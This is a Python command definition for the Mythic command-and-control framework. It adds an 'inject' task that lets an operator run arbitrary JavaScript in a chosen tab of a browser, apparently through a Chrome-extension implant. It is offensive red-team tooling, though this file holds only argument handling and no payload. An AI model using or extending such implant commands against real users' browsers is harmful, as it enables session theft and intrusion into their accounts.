from mythic_container.MythicCommandBase import *

from .tasking import wired_tasking


class InjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="tab_id",
                type=ParameterType.Number,
                description="Target tab ID",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="javascript",
                type=ParameterType.String,
                description="JavaScript to run in the page",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="world",
                type=ParameterType.ChooseOne,
                choices=["MAIN", "ISOLATED"],
                default_value="MAIN",
                description="Chrome script world",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            raise ValueError("inject requires tab_id and javascript")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        raise ValueError("inject requires named arguments")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = "inject -tab_id 1 -javascript 'document.title'"
    description = "Run JavaScript in a tab"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1059.007"]
    argument_class = InjectArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return wired_tasking(taskData, f"tab {taskData.args.get_arg('tab_id')}")

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
